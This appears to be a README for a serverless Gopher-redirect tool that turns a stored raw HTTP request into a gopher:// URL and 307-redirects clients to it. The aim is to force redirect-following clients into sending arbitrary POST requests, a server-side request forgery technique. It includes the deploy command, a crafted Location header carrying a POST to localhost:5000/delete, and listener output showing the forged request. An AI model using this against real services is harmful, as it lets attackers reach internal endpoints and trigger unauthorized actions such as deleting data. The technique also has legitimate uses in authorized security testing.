# Gopher Redirect

This serverless function reads in a raw request from the `redirect_request.req` file, converts it to a Gopher URL, and then redirects any incoming request to that URL.

This can be extremely useful to force a client to switch from a GET request to an anrbitrary POST request (assuming the client supports Gopher).

## Deployment
Customize the file `redirect_request.req` with the plaintext request you want. The example included is a POST request to `localhost:5000/delete`. 

The function also requires the environment variable `REDIRECT_HOST`, which is where the Gopher data will be sent.

To deploy:

```
$ now -e REDIRECT_HOST="localhost:5000" --public
```

## Example usage
Any request to the function will be 307 redirected to a Gopher URL based on the supplied `redirect_request.req` file:

```
$ curl -i https://gopherredirect-htmexdltcs.now.sh/asdf
HTTP/2 307
date: Sun, 11 Nov 2018 01:07:48 GMT
location: gopher://localhost:5000/_POST /delete HTTP/1.1%0AHost: localhost:5000%0AConnection: close%0A
```

If the client follows redirects and supports Gopher, a POST request will be made:

```
$ curl -L https://gopherredirect-htmexdltcs.now.sh/asdf

$ ncat -lp 5000
POST /delete HTTP/1.1
Host: localhost:5000
Connection: close
```

